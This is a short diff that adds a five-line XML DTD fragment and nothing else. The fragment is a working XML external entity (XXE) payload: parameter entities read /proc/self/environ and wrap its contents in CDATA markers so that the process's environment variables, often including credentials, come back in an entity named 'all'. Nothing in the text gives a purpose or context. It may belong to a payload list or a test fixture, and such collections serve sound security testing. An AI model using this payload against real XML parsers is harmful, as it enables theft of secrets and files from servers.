@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:////proc/self/environ">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
+%wrapper;
